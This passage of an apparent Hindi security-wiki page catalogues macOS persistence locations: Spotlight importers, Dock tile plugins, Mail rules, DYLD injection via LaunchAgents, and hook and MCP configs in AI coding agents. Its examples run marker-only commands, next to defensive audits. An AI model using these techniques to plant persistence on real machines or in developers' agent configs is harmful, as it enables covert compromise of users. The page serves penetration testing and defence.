Spotlight का अंतर्निहित तंत्र 'mds' नाम की एक केंद्रीय process पर निर्भर करता है, जिसका अर्थ **'metadata server'** है। यह process पूरी Spotlight service का संचालन करती है। इसके साथ, कई 'mdworker' daemons अलग-अलग फ़ाइल प्रकारों को index करने जैसे विभिन्न रखरखाव कार्य करते हैं (`ps -ef | grep mdworker`)। ये कार्य Spotlight importer plugins, या **".mdimporter bundles**" के ज़रिए संभव होते हैं, जिनकी मदद से Spotlight अलग-अलग फ़ाइल फ़ॉर्मैट की सामग्री को समझ और index कर सकता है।

Plugins या **`.mdimporter`** bundles पहले बताए गए स्थानों पर मौजूद होते हैं। नए bundle का पता लगना और उसका किसी फ़ाइल प्रकार से मेल खाना ज़रूरी है; साथ ही, Spotlight को मेल खाने वाली फ़ाइल को वास्तव में index करना होगा। केवल bundle कॉपी करने से यह साबित नहीं होता कि वह load हो गया है। [Apple का MDImporter reference](https://developer.apple.com/documentation/coreservices/file_metadata/mdimporter) loading को ऐसी पात्र फ़ाइल से जोड़ता है जिसमें बदलाव हुआ हो। यहाँ macOS 26 पर Spotlight importer का execution test नहीं किया गया।

चल रहे सभी `mdimporters` को इस तरह **ढूँढ़ा** जा सकता है:

```bash
mdimport -L
Paths: id(501) (
    "/System/Library/Spotlight/iWork.mdimporter",
    "/System/Library/Spotlight/iPhoto.mdimporter",
    "/System/Library/Spotlight/PDF.mdimporter",
    [...]
```

और उदाहरण के लिए **/Library/Spotlight/iBooksAuthor.mdimporter** का उपयोग इस प्रकार की फ़ाइलों (अन्य के साथ `.iba` और `.book` extensions) को parse करने के लिए किया जाता है:

```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
    0 => {
      "CFBundleTypeName" => "iBooks Author Book"
      "CFBundleTypeRole" => "MDImporter"
      "LSItemContentTypes" => [
        0 => "com.apple.ibooksauthor.book"
        1 => "com.apple.ibooksauthor.pkgbook"
        2 => "com.apple.ibooksauthor.template"
        3 => "com.apple.ibooksauthor.pkgtemplate"
      ]
      "LSTypeIsPackage" => 0
    }
  ]
[...]
 => {
      "UTTypeConformsTo" => [
        0 => "public.data"
        1 => "public.composite-content"
      ]
      "UTTypeDescription" => "iBooks Author Book"
      "UTTypeIdentifier" => "com.apple.ibooksauthor.book"
      "UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
      "UTTypeTagSpecification" => {
        "public.filename-extension" => [
          0 => "iba"
          1 => "book"
        ]
      }
    }
[...]
```

> [!CAUTION]
> अगर आप किसी अन्य `mdimporter` की Plist जाँचते हैं, तो हो सकता है कि आपको **`UTTypeConformsTo`** entry न मिले। ऐसा इसलिए है क्योंकि यह एक built-in _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) है और इसमें extensions निर्दिष्ट करने की ज़रूरत नहीं होती।
>
> इसके अलावा, System के default plugins को हमेशा प्राथमिकता मिलती है, इसलिए attacker केवल उन files तक पहुँच सकता है जिन्हें Apple के अपने `mdimporters` अन्यथा index नहीं करते।

अपना importer बनाने के लिए आप इस project से शुरुआत कर सकते हैं: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer), फिर उसका नाम बदलें, **`CFBundleDocumentTypes`** बदलें और **`UTImportedTypeDeclarations`** जोड़ें, ताकि वह उन extensions को support करे जिन्हें आप support करना चाहते हैं, और उन्हें **`schema.xml`** में भी दर्ज करें।\
फिर **`GetMetadataForFile`** function का code **बदलें**, ताकि processed extension वाली file बनने पर आपका payload execute हो।

अंत में, अपना नया `.mdimporter` **build करके पिछली तीन locations में से किसी एक पर copy करें**। आप **logs monitor करके** या **`mdimport -L`** चलाकर जाँच सकते हैं कि यह load हुआ है या नहीं।

> [!TIP]
> भले ही importer sandbox बहुत restrictive हो, `mdworker` files को **privileged read access** के साथ index करता है। इसलिए एक malicious `.mdimporter`, TCC-protected locations (Downloads, Pictures, Desktop, …) के अंदर की files का *content* पढ़ सकता है और बिना किसी TCC prompt के जुटाया गया metadata exfiltrate कर सकता है — यह **"Sploitlight" TCC bypass (CVE-2025-31199)** है, जिसे macOS Sequoia 15.4 में patch किया गया।<sup>[[55]](#references)</sup>

### ~~प्रेफरेंस पेन~~

> [!CAUTION]
> ऐसा नहीं लगता कि यह अब काम कर रहा है।

Writeup: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)<sup>[[26]](#references)</sup>

- sandbox bypass करने के लिए उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)
  - इसके लिए user की एक खास कार्रवाई ज़रूरी है
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### विवरण

ऐसा नहीं लगता कि यह अब काम कर रहा है।<sup>[[26]](#references)</sup>

### Application Script Files

Writeup: [https://theevilbit.github.io/beyond/beyond_0010/](https://theevilbit.github.io/beyond/beyond_0010/)<sup>[[37]](#references)</sup>

- sandbox bypass करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
  - लेकिन targeted application का installed होना और victim द्वारा चलाया/इस्तेमाल किया जाना ज़रूरी है
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

एक **interpreted script जिसे कोई installed application या tool वास्तव में execute करता है** और जिसे actor modify कर सकता है। File की permissions और उसे call करने वाले path की पुष्टि करें; केवल `.sh` या `.py` file मिल जाना पर्याप्त नहीं है। Apple की [code-signing guide](https://developer.apple.com/library/archive/documentation/Security/Conceptual/CodeSigningGuide/Procedures/Procedures.html) के अनुसार, signed app bundles scripts सहित resources को seal करते हैं। Bundle के भीतर किसी script को edit करने से वह seal टूट जाती है और bundle validate किए जाने पर इसका पता चल सकता है या इसे block किया जा सकता है। Homebrew के launcher जैसी external script का signing और trust behavior अलग होता है। Writeup में दिए गए ऐतिहासिक उदाहरण:

- **`/Applications/Sublime Text.app/Contents/MacOS/sublime.py`** – पुराने Sublime Text releases द्वारा इस्तेमाल की जाने वाली script; installed version के लिए file और उसके startup में इस्तेमाल होने की जाँच करनी चाहिए। Test Mac पर यह मौजूद नहीं थी।
- **`/opt/homebrew/bin/brew`** (Apple Silicon) या **`/usr/local/bin/brew`** (Intel) – जब `brew` path invoke किया जाता है, तो यह Bash launcher execute होता है, बशर्ते यह installed हो और actor इसमें लिख सकता हो। Test Mac पर `/opt/homebrew/bin/brew` एक writable Bash script थी; यह केवल एक स्थानीय observation है, Homebrew permissions का कोई सामान्य नियम नहीं।
- Python app bundle के अंदर IDLE की `idlemain.py` – इसमें लिखने के लिए admin permission की ज़रूरत हो सकती है, लेकिन यह IDLE user की identity के साथ चलती है।
- **`/Library/Application Support/Wireshark/ChmodBPF/ChmodBPF`** – `org.wireshark.ChmodBPF` से संबंधित launchd job installed होने पर ऐतिहासिक रूप से root के रूप में चलने वाली shell script। Test Mac पर script और job मौजूद नहीं थे।

#### विवरण और Exploitation

कुछ tools और apps runtime पर interpreted scripts execute करते हैं। यदि signature validation, quarantine और अन्य checks इसकी अनुमति दें, तो writable script में जोड़े गए commands उस script के specific caller के अगली बार चलने पर execute हो सकते हैं। मूल research में 2019 के कई installations दिखाए गए थे; target version पर उनके paths और triggers की फिर से जाँच करें।<sup>[[37]](#references)</sup>

```python
# Marker-only injection test on a COPY of Homebrew's launcher. The relocated
# copy may fail its normal Homebrew logic; the marker checks script execution.
import pathlib, subprocess, tempfile

source = pathlib.Path('/opt/homebrew/bin/brew')
with tempfile.TemporaryDirectory(prefix='ht-script-copy-') as root:
    target = pathlib.Path(root) / 'brew'
    marker = pathlib.Path(root) / 'ran'
    lines = source.read_text().splitlines(keepends=True)
    target.write_text(lines[0] + '/usr/bin/touch ' + str(marker) + '\n' + ''.join(lines[1:]))
    target.chmod(0o700)
    subprocess.run([str(target), '--version'], capture_output=True, timeout=15)
    print('marker fired:', marker.exists())
```

इस copy test ने macOS 26.5.2 पर `marker fired: True` दिखाया; original launcher को नहीं छुआ गया था। यह साबित करता है कि insertion point copy में execute होता है, न कि यह कि modified signed app bundle या वास्तविक Homebrew installation हर launch check में सफल होगा।

### Dock Tile Plugins

लेख: [https://theevilbit.github.io/beyond/beyond_0032/](https://theevilbit.github.io/beyond/beyond_0032/)<sup>[[38]](#references)</sup>

- sandbox bypass करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
  - इसके लिए ज़रूरी है कि plug-in घोषित करने वाले app का पता लगाया/पंजीकरण किया जाए और Dock उसे process करे
  - plugin ऐसे **Apple-signed** helper में load होता है, जिसमें app-sandbox entitlement नहीं है और **library validation disabled** है। उद्धृत research में यह helper Background Task Management UI में दिखाई नहीं दिया था; target release पर इसकी visibility जाँची जानी चाहिए।
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`<App>.app/Contents/PlugIns/<name>.docktileplugin`**, जिसे app की `Info.plist` में **`NSDockTilePlugIn`** key के ज़रिए refer किया जाता है; plugin की अपनी `Info.plist` में **`NSPrincipalClass`** सेट होता है।

#### Description & Exploitation

जब कोई app `NSDockTilePlugIn` घोषित करता है, तो Dock refer किए गए bundle को login के समय या उसका tile जोड़े जाने पर **`com.apple.dock.external.extra`** XPC helper (`...extra.arm64` on Apple Silicon) में load कर सकता है; app को स्वयं launch होने की ज़रूरत नहीं है। इसके लिए ज़रूरी है कि macOS app का पता लगाए/पंजीकरण करे और उसे स्वीकार करे। Helper **Apple-signed** है, इसमें `com.apple.security.app-sandbox` entitlement नहीं है और इसमें `com.apple.security.cs.disable-library-validation` है। Load होने पर principal class का **`setDockTile:`** method invoke किया जाता है; वहाँ से यह बाद की घटनाओं के लिए distributed notifications (उदाहरण के लिए, `com.apple.screenIsLocked`) subscribe कर सकता है।<sup>[[38]](#references)</sup>

macOS 26.5.2 पर, read-only `codesign` inspection ने helper के Apple signature और entitlements की पुष्टि की, और कई installed apps में `NSDockTilePlugIn` घोषित था। उस Mac पर कोई नया plug-in install या load नहीं किया गया, इसलिए उस release पर नए लिखे गए bundle का execution अभी भी untested है।

```bash
# Enumerate apps already shipping a Dock tile plugin (hijack / template targets)
for a in /Applications/*.app /System/Applications/*.app; do
  v=$(/usr/libexec/PlistBuddy -c 'Print :NSDockTilePlugIn' "$a/Contents/Info.plist" 2>/dev/null) \
    && echo "$a -> $v"
done
# e.g. on macOS 26: Calendar.app, App Store.app, System Settings.app, plus 3rd-party Warp.app / ChatGPT.app
```

```objc
// Principal class, built as MyPlugin.docktileplugin, placed in <App>.app/Contents/PlugIns/
// App Info.plist:    NSDockTilePlugIn = MyPlugin.docktileplugin
// Plugin Info.plist: NSPrincipalClass = MyDockPlugin , CFBundlePackageType = BNDL
@interface MyDockPlugin : NSObject <NSDockTilePlugIn>
@end
@implementation MyDockPlugin
- (void)setDockTile:(NSDockTile *)dockTile {
    system("touch /tmp/hacktricks_docktile");   // runs when the tile is added to the Dock / at login
}
@end
```

### Widgets (Notification Center / WidgetKit)

लेख: [https://theevilbit.github.io/beyond/beyond_0033/](https://theevilbit.github.io/beyond/beyond_0033/)<sup>[[39]](#references)</sup>

- sandbox को bypass करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
  - Widget extension अपने **अलग process** में चलता है, और इसे जोड़ने से **Background Task Management alert** नहीं आता
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - config plist, TCC-सुरक्षित container के अंदर होता है, इसलिए इसे बाहर से संपादित करने के लिए Full Disk Access या TCC bypass की ज़रूरत होती है

#### स्थान

- Widget extension bundle: **`<App>.app/Contents/PlugIns/<Widget>.appex`**
- सक्रिय/रजिस्टर किए गए widgets: **`~/Library/Containers/com.apple.notificationcenterui/Data/Library/Preferences/com.apple.notificationcenterui.plist`** (keys `widgets.instances` और `widgets.widgets`)

#### विवरण और Exploitation

किसी app के अंदर भेजा गया WidgetKit extension, Notification Center द्वारा प्रबंधित **अपने अलग process** में चलता है। `widgets.instances` में एक instance रजिस्टर करने पर (यह एक base64 `NSKeyedArchiver`-encoded `CHSWidget` blob होता है, जिसमें `INIntent` data एम्बेडेड होता है) और NotificationCenter को restart करने पर widget लोड होता है और अपना `TimelineProvider`/intent code चलाता है।<sup>[[39]](#references)</sup>

```bash
# Inspect currently-registered widgets (file present on stock macOS)
plutil -p ~/Library/Containers/com.apple.notificationcenterui/Data/Library/Preferences/com.apple.notificationcenterui.plist \
  | grep -iE "widgets?\." | head
```

### Mail.app नियम (AppleScript चलाएँ)

लेख: [https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/](https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/)<sup>[[42]](#references)</sup>

- sandbox bypass करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
  - लेकिन Mail.app में कोई account कॉन्फ़िगर होना चाहिए और यह चल रहा होना चाहिए; trigger आने वाला email है
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - Mail के बाहर से rules/scripts संपादित करने के लिए Mail को बंद करना और आधुनिक macOS पर Full Disk Access देना आवश्यक हो सकता है

#### स्थान

- **`~/Library/Mail/V10/MailData/SyncedRules.plist`** (स्थानीय rules; Sonoma/Sequoia पर `V10`, नए संस्करणों पर `V11`+)
- **`~/Library/Mobile Documents/com~apple~mail/Data/V10/MailData/ubiquitous_SyncedRules.plist`** (iCloud-सिंक किए गए rules, जिन्हें प्राथमिकता मिलती है)
- Rule enablement: **`RulesActiveState.plist`**; AppleScript payload: **`~/Library/Application Scripts/com.apple.mail/*.scpt`**

#### विवरण और शोषण

Apple Mail के एक **rule** में *"Run AppleScript"* action हो सकता है। ऐसा rule जोड़कर जो बनाए गए **subject line** से मेल खाता है और attacker script चलाता है, हमलावर को Mail के context में **दूर से trigger किया जा सकने वाला, छिपा हुआ** code execution मिलता है, जब भी वह विशेष email आता है—यह एक ऐसा vector है जो कई persistence scanners से बच निकलता है, क्योंकि कोई LaunchAgent/Login Item नहीं बनाया जाता।<sup>[[42]](#references)</sup> Trigger email को **delete** करने के लिए भी rule सेट करने से सबूत छिप जाता है। Defenders इसे सीधे खोज सकते हैं:<sup>[[43]](#references)</sup>

```bash
# Enumerate Mail rules that invoke AppleScript
grep -A1 -i "AppleScript" ~/Library/Mail/V*/MailData/SyncedRules.plist 2>/dev/null
plutil -p ~/Library/Mail/V*/MailData/SyncedRules.plist 2>/dev/null | grep -iE "AppleScript|ShouldTransfer|Delete"
```

### Configuration Profiles (.mobileconfig)

लेख: [https://www.jamf.com/blog/malicious-profiles-come/](https://www.jamf.com/blog/malicious-profiles-come/)<sup>[[44]](#references)</sup>

- sandbox bypass करने के लिए उपयोगी: [🔴](https://emojipedia.org/large-red-circle)
  - आधुनिक macOS में System Settings → *Device Management* में **उपयोगकर्ता की मैन्युअल स्वीकृति** आवश्यक है (MDM के बाहर silent `profiles install` अब उपलब्ध नहीं है)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### स्थान

- इंस्टॉल किए गए profiles **`/Library/Managed Preferences/`** और **`/var/db/ConfigurationProfiles/`** के अंतर्गत रहते हैं; profile एक XML plist होता है, जिसमें `PayloadContent` array होता है।

#### विवरण और शोषण

`.mobileconfig` सीधे code execution का साधन नहीं है, लेकिन यह **trusted root CA** (`com.apple.security.root`), **global या PAC proxy** (`com.apple.proxy.*`), **managed preferences** (`com.apple.ManagedClient.preferences`), या restrictions जैसी configuration को बनाए रख सकता है। macOS 10.15 और उसके बाद के संस्करणों में, Apple की [`PayloadRemovalDisallowed` परिभाषा](https://developer.apple.com/documentation/devicemanagement/toplevel) के अनुसार, इसे `true` पर सेट करने से **मैन्युअल रूप से इंस्टॉल किए गए** उस profile को हटाने के लिए **administrator authentication** आवश्यक होता है, जिसमें removal-password payload न हो; इससे profile को पूरी तरह हटाना असंभव नहीं हो जाता। MDM से इंस्टॉल किए गए profiles के लिए management और removal के अलग नियम हैं।<sup>[[44]](#references)</sup>

> [!WARNING]
> एक सामान्य configuration profile में **ऐसा कोई payload type नहीं है जो मनमाने `LaunchDaemon`/`LaunchAgent` को इंस्टॉल करे**। इस तरह daemon इंस्टॉल करने के लिए पूर्ण **MDM enrollment** और साथ में management agent/script की आवश्यकता होती है — `.mobileconfig` को launchd delivery mechanism न मानें।

```bash
# Inspect installed profiles (user context)
profiles list            # per-user
sudo profiles show       # system (root)
```

### DYLD_INSERT_LIBRARIES Persistence

- Sandbox bypass करने के लिए उपयोगी: [🔴](https://emojipedia.org/large-red-circle)
  - dyld, SIP/platform binaries, hardened-runtime apps और setuid targets के लिए `DYLD_*` को **strips** करता है, इसलिए यह केवल unprotected processes में inject करता है और SIP/hardened runtime को bypass **नहीं** करता
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- विश्वसनीय तरीका: malicious `LaunchAgent`/`LaunchDaemon` plist के अंदर **`EnvironmentVariables`** dict (login/boot पर चलता है)
- पुराना/ऐतिहासिक (केवल रिपोर्ट करें): **`~/.MacOSX/environment.plist`** (10.8 में हटाया गया) और **`/etc/launchd.conf`** (10.10 में हटाया गया)

#### Description & Exploitation

अगर attacker `DYLD_INSERT_LIBRARIES` को victim process के environment में डाल सकता है, तो dyld उस process में attacker dylib को load करता है (उसका constructor चलता है)। Persistent variant इस variable को LaunchAgent में embed करता है, ताकि job के हर launch पर यह फिर से inject हो। ध्यान दें कि आधुनिक macOS पर `launchctl setenv DYLD_*` को filter किया जाता है, इसलिए इसके बजाय इसे plist में embed करें।<sup>[[45]](#references)</sup>

```xml
<key>EnvironmentVariables</key>
<dict>
    <key>DYLD_INSERT_LIBRARIES</key>
    <string>/tmp/evil.dylib</string>
</dict>
```

डायलिब injection/hijacking की पूरी प्रक्रिया के लिए देखें:

{{#ref}}
macos-security-and-privilege-escalation/macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

### AI Coding Agent CLIs (hooks, MCP servers, rules files)

Writeups: [CVE-2025-59536 (Check Point)](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)<sup>[[47]](#references)</sup>, [Rules File Backdoor (Pillar Security)](https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents)<sup>[[48]](#references)</sup>

- sandbox bypass करने में उपयोगी: [✅](https://emojipedia.org/check-mark-button)
  - इसके लिए डेवलपर को संबंधित agent का उपयोग करना होगा। जब agent उसका configuration स्वीकार करता है, तो startup commands उस उपयोगकर्ता के privileges के साथ चलते हैं; workspace trust और MCP approval, product और session mode के अनुसार अलग-अलग होते हैं।
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle) (उपयोगकर्ता के रूप में चलता है; terminal/agent के पास पहले से जो भी permissions हैं, वे विरासत में मिलती हैं)

#### Location

स्पष्ट hook और MCP configuration files के कारण **डेवलपर द्वारा tool का उपयोग करने पर shell commands या child processes चल सकते हैं** — या तो per-user global file से (persistence) या repo में commit की गई file से (supply-chain)। `CLAUDE.md`, `AGENTS.md`, `GEMINI.md`, और editor rules **agent के लिए instructions हैं**, पढ़े जाने पर shell execution की गारंटी नहीं; उनका प्रभाव agent के व्यवहार और tool permissions पर निर्भर करता है। हर product के मौजूदा trust और approval rules जांचें।

- **Claude Code**
  - `~/.claude/settings.json`, project `.claude/settings.json`, `.claude/settings.local.json`, और केवल root के लिए उपलब्ध **`/Library/Application Support/ClaudeCode/managed-settings.json`** (MDM/managed settings को उपयोगकर्ता **override नहीं कर सकता** → मजबूत persistence)
  - `hooks` object — events `PreToolUse`, `PostToolUse`, `UserPromptSubmit`, `Stop`, `SubagentStop`, `SessionStart`, `SessionEnd`, `Notification`, `PreCompact` — हर event एक shell `command` चलाता है
  - `statusLine.command` — status line दिखाने के लिए चलाया जाने वाला shell command (हर session)
  - `~/.claude.json` / project `.mcp.json` में MCP servers — child processes के रूप में `command`+`args` लॉन्च होते हैं
  - `CLAUDE.md` / `~/.claude/CLAUDE.md` — ऐसी instructions जो prompt injection का प्रयास कर सकती हैं; यह agent के व्यवहार और tool permissions पर निर्भर करता है
- **OpenAI Codex CLI**: `~/.codex/config.toml` `[mcp_servers.*]` (`command`/`args` child processes के रूप में लॉन्च होते हैं); `AGENTS.md` project instructions
- **Gemini CLI**: `~/.gemini/settings.json` (`hooks`, MCP servers); `GEMINI.md`
- **Cursor**: `~/.cursor/hooks.json` (`beforeShellExecution`, `afterAgentResponse`, `stop`, … commands चलाते हैं); `.cursor/rules/`, `.cursorrules`, `~/.cursor/mcp.json`; GitHub Copilot `.github/copilot-instructions.md`

#### Description & Exploitation

अगर कोई actor खाते की user-global settings बदल सकता है, तो उसके hook या MCP commands उस खाते के अंतर्गत भविष्य के sessions में चल सकते हैं। Repository-नियंत्रित config एक अलग मामला है: [Claude Code के मौजूदा security docs](https://code.claude.com/docs/en/security) में interactive workspace trust dialog और project `.mcp.json` servers के लिए अलग approval prompt का वर्णन है। [उसकी permission matrix](https://code.claude.com/docs/en/permissions#what-runs-before-you-trust-a-folder) के अनुसार, parent folder को trust किए जाने के बाद hooks चल सकते हैं, और `claude -p`/SDK sessions में interactive trust prompt नहीं दिखता; इन noninteractive modes में project MCP servers बिना approval prompt के connect होते हैं। CVE-2025-59536 के रूप में रिपोर्ट किया गया pre-trust project hook bypass [2025 में ठीक कर दिया गया था](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/); इसे मौजूदा default behavior न मानें। Delivery vectors में compromised repository या malicious installer शामिल हो सकते हैं। Rules-file prompt injection, स्पष्ट hook की तुलना में कम निश्चित है और फिर भी tool approvals पर निर्भर करता है।<sup>[[47]](#references)</sup><sup>[[48]](#references)</sup>

Claude Code user-global settings का उदाहरण; testing करते समय इसे केवल disposable account में रखें:

```json
{
  "hooks": {
    "SessionStart": [
      { "hooks": [ { "type": "command", "command": "touch /tmp/hacktricks_claude_hook" } ] }
    ]
  },
  "statusLine": { "type": "command", "command": "touch /tmp/hacktricks_statusline; echo HT" }
}
```

उदाहरण के लिए user-global Codex MCP configuration:

```toml
[mcp_servers.evil]
command = "/bin/sh"
args = ["-c", "touch /tmp/hacktricks_codex_mcp; exec real-mcp-server"]
```

उदाहरण Cursor hook configuration; इसका उपयोग करने से पहले इसके इंस्टॉल किए गए version के schema की जाँच करें:

```json
{ "version": 1, "hooks": { "beforeShellExecution": [ { "command": "touch /tmp/hacktricks_cursor_hook" } ] } }
```

```bash
# Defensive audit: which agent configs can auto-run commands?
ls -la .claude/settings*.json .mcp.json ~/.claude/settings.json ~/.claude.json \
       ~/.codex/config.toml ~/.gemini/settings.json ~/.cursor/hooks.json \
       ~/.cursor/mcp.json .cursor/rules .cursorrules .github/copilot-instructions.md 2>/dev/null
python3 -c 'import json;d=json.load(open("'"$HOME"'/.claude/settings.json"));print("claude hooks:",list(d.get("hooks",{}).keys()),"statusLine:",bool(d.get("statusLine")))' 2>/dev/null
```

### Browser Extensions (Chromium: Chrome / Brave / Edge)

विवरण: [Chrome external extensions](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions)<sup>[[49]](#references)</sup>, [macOS पर ExtensionInstallForcelist का दुरुपयोग](https://macsecurity.net/view/492-extensioninstallforcelist-chrome-policy-mac)<sup>[[50]](#references)</sup>

- Sandbox bypass करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
  - इसके लिए समर्थित browser और installed, enabled extension आवश्यक है। macOS पर External Extensions के लिए user confirmation आवश्यक है; managed force-install के लिए लागू enterprise policy आवश्यक है।
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

> [!NOTE]
> यह **native messaging hosts** से अलग है (ऊपर *Chrome native messaging hosts* section देखें)। यहाँ persistence स्वयं **auto-installed extension** है।

#### Location

- **External Extensions JSON** (browser शुरू होने पर खोजी जाती है, फिर macOS पर enable करने का prompt दिखता है):
  - Chrome: `~/Library/Application Support/Google/Chrome/External Extensions/<extID>.json` (प्रति-user) या `/Library/Application Support/Google/Chrome/External Extensions/` (सभी users के लिए)
  - Brave: `~/Library/Application Support/BraveSoftware/Brave-Browser/External Extensions/`
  - Edge: `~/Library/Application Support/Microsoft Edge/External Extensions/`
- Managed preferences / configuration profile के ज़रिए **enterprise-policy force-install**:
  - `com.google.Chrome` key `ExtensionInstallForcelist` (Brave `com.brave.Browser`, Edge `com.microsoft.Edge`), जिसे `/Library/Managed Preferences/` या installed `.mobileconfig` से पढ़ा जाता है

#### Description & Exploitation

ये installation के दो अलग-अलग तरीके हैं। Chrome का [external-install documentation](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions) कहता है कि *External Extensions* file के ज़रिए दी गई extension को **Windows और macOS users को confirm और enable करना होगा**; केवल उस JSON file को लिख देने से यह execute नहीं होती। macOS पर सभी users के लिए installation हेतु Chrome यह भी आवश्यक करता है कि external-extension file को unprivileged modification से सुरक्षित रखा जाए। Managed `ExtensionInstallForcelist` या `ExtensionSettings` policy बिना user interaction के extension install और pin कर सकती है; [Google's Mac policy guide](https://support.google.com/chrome/a/answer/7517624) managed configuration का वर्णन करती है और कहती है कि user force-installed extensions को हटा नहीं सकता। यह policy deployment का तरीका है, per-user `defaults write` का shortcut नहीं।<sup>[[49]](#references)</sup>

> [!WARNING]
> macOS पर *External Extensions* JSON manifest में **Chrome Web Store** का update URL होना चाहिए, local CRX का नहीं। Managed policy deployment की अपनी enterprise prerequisites होती हैं और यह managed self-hosted update URL की अनुमति दे सकती है। Test profile में local unpacked extension के लिए Chrome का developer-mode `--load-extension=/path` switch एक अलग mechanism है; इससे External Extensions JSON file अपने-आप execute नहीं होती। `Secure Preferences` में write को इन दोनों documented registration routes के बराबर न मानें।

```bash
# In a disposable browser account, propose a Chrome Web Store extension for enablement
ext_id='replace_with_32_character_web_store_id'
external_dir="$HOME/Library/Application Support/Google/Chrome/External Extensions"
mkdir -p "$external_dir"
cat > "$external_dir/$ext_id.json" <<'JSON'
{ "external_update_url": "https://clients2.google.com/service/update2/crx" }
JSON
```

उस disposable account में Chrome शुरू करें और enable prompt देखें; उपयोगकर्ता के स्वीकार करने के बाद extension का अपना व्यवहार ही execution PoC है। परीक्षण के बाद manifest हटाएँ और उस profile में extension को disable/uninstall करें। Research Mac के active Chrome profile में इस तरीके का परीक्षण **नहीं** किया गया था। वहाँ managed-policy वाला तरीका भी लागू नहीं किया गया था।

Force-install और External Extensions, **Chrome Web Store** extension IDs को संदर्भित करते हैं; profile के HMAC-signed `Secure Preferences` में बदलाव करके local extension को चुपचाप inject करने की निचले स्तर की तरकीब और Chromium-process के अन्य दुरुपयोग के लिए देखें:

{{#ref}}
macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md
{{#endref}}

### URL Scheme और File-Type Handlers (LaunchServices)

लेख: [Custom URL Schemes के ज़रिए Remote Mac Exploitation (Objective-See)](https://objective-see.org/blog/blog_0x38.html)<sup>[[52]](#references)</sup>

- Sandbox को bypass करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
  - Trigger तब होता है जब victim किसी link (जैसे Chrome/Brave/Safari में) पर click करता है या registered type की file खोलता है
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### स्थान

- App bundle का `Info.plist`, जिसमें **`CFBundleURLTypes`/`CFBundleURLSchemes`** (custom URL scheme) या **`CFBundleDocumentTypes`** (file extension/UTI) घोषित हो
- प्रति-user प्रभावी defaults **`~/Library/Preferences/com.apple.LaunchServices/com.apple.launchservices.secure.plist`** (`LSHandlers` array) में दिखाई दे सकते हैं। URL-scheme default चुनने के लिए Apple का समर्थित API `LSSetDefaultHandlerForURLScheme` है; उस plist में सीधे लिखना, registration या cache update का documented तरीका नहीं है।

#### विवरण और Exploitation

Launch Services, registered app के `Info.plist` से URL-scheme और document claims प्राप्त करता है। [Apple की registration guide](https://developer.apple.com/library/archive/documentation/Carbon/Conceptual/LaunchServicesConcepts/LSCTasks/LSCTasks.html) के अनुसार registration तब हो सकता है जब Finder app को खोजे, boot या login के दौरान, या किसी explicit registration API के ज़रिए; app को कहीं लिख देना तत्काल trigger होने की गारंटी नहीं है। Registration के बाद, matching URL या document खोलने पर चुना गया handler app launch हो सकता है—यह user की default-handler पसंद और macOS के सामान्य launch checks के अधीन है। समर्थित `LSSetDefaultHandlerForURLScheme` API, user की पसंद का URL handler बदलता है; इससे नई drop की गई app अपने-आप execute नहीं होती।<sup>[[52]](#references)</sup>

```bash
# Inspect known handlers without registering an app or changing defaults
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -dump | grep -A3 "scheme:"
```

macOS 26.5.2 research Mac पर कोई app register नहीं किया गया और न ही कोई handler preference बदली गई। किसी वास्तविक handler को test करने के लिए, एक disposable user account का उपयोग करें, unique scheme वाला केवल marker app register करें, उसका URL invoke करें, फिर app और उसका registration हटा दें।

File-extension और URL-scheme handlers को विस्तार से enumerate/abuse करने के लिए देखें:

{{#ref}}
macos-security-and-privilege-escalation/macos-file-extension-apps.md
{{#endref}}

### Python startup files (`.pth` / `usercustomize` / `sitecustomize`)

लेखन: [https://docs.python.org/3/library/site.html](https://docs.python.org/3/library/site.html)<sup>[[56]](#references)</sup>

- Sandbox bypass के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
  - यह तब चलता है जब संबंधित Python interpreter उस site directory को enabled रखते हुए शुरू होता है; यह trigger सभी virtual environments, Python builds या startup flags पर लागू नहीं होता
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - यह उस process के privileges/TCC के साथ चलता है जिसने interpreter launch किया हो

#### Location

